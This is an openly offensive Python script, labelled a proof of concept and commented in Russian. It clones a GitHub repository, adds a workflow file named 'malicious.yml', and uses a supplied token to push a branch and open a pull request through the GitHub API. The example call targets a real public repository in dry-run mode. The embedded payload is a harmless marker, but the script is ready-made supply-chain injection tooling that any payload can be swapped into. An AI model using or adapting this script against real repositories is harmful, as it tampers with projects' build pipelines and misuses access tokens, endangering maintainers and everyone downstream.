#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GitHub Supply-Chain Injector (PoC)
"""
import os
import subprocess
import tempfile
import requests
import json
from typing import Dict, Any

def inject_github_pull_request(repo_url: str, github_token: str = None, branch_name: str = "malicious-payload") -> Dict[str, Any]:
    """
    PoC: Клонирует репозиторий, добавляет вредоносный workflow, создает ветку, коммит, push, PR через GitHub API.
    Если github_token не указан — только имитация (без push/PR).
    """
    result = {"status": "error", "details": ""}
    with tempfile.TemporaryDirectory() as tmpdir:
        try:
            # Клонируем репозиторий
            subprocess.check_call(["git", "clone", repo_url, tmpdir])
            os.chdir(tmpdir)
            # Создаем новую ветку
            subprocess.check_call(["git", "checkout", "-b", branch_name])
            # Добавляем вредоносный workflow (PoC)
            os.makedirs(".github/workflows", exist_ok=True)
            workflow_path = ".github/workflows/malicious.yml"
            with open(workflow_path, "w") as f:
                f.write("""
name: Malicious Workflow
on: [push]
jobs:
  evil:
    runs-on: ubuntu-latest
    steps:
      - name: Evil step
        run: echo 'pwned' > /tmp/pwned.txt
""")
            subprocess.check_call(["git", "add", workflow_path])
            subprocess.check_call(["git", "commit", "-m", "Add malicious workflow [PoC]"])
            if github_token:
                # Настраиваем remote с токеном
                repo_https = repo_url.replace("https://", f"https://{github_token}@")
                subprocess.check_call(["git", "push", repo_https, branch_name])
                # Создаем pull request через GitHub API
                owner_repo = repo_url.split("github.com/")[-1].replace(".git", "")
                pr_url = f"https://api.github.com/repos/{owner_repo}/pulls"
                headers = {"Authorization": f"token {github_token}", "Accept": "application/vnd.github.v3+json"}
                data = {
                    "title": "[PoC] Add malicious workflow",
                    "head": branch_name,
                    "base": "main",
                    "body": "This is a PoC malicious workflow injection."
                }
                resp = requests.post(pr_url, headers=headers, data=json.dumps(data))
                if resp.status_code in (200, 201):
                    result["status"] = "success"
                    result["details"] = f"Pull request created: {resp.json().get('html_url')}"
                else:
                    result["details"] = f"PR failed: {resp.status_code} {resp.text}"
            else:
                result["status"] = "dryrun"
                result["details"] = "Workflow injected, but no push/PR (no token, PoC only)"
        except Exception as e:
            result["details"] = str(e)
    return result

if __name__ == "__main__":
    # Пример dryrun
    print(inject_github_pull_request("https://github.com/stevemao/left-pad.git")) 